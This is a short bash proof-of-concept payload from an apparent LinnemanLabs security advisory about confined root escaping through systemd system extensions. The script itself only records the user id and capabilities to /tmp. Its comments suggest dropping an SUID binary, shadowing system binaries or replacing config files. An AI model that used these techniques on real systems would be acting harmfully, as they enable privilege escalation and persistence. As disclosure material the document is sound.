#!/bin/bash
#
# LinnemanLabs - sysext payload
#
# https://linnemanlabs.com/posts/confined-root-is-still-root/
# https://github.com/linnemanlabs/advisories/
#
# use this concept to drop an SUID binary, or shadow an existing
# binary so this runs instead of it. or replace a config file, or just
# drop a longer shellscript payload than you can stuff in one line.
#
{ id; grep ^Cap /proc/self/status; } > /tmp/sysext.out
exit 0
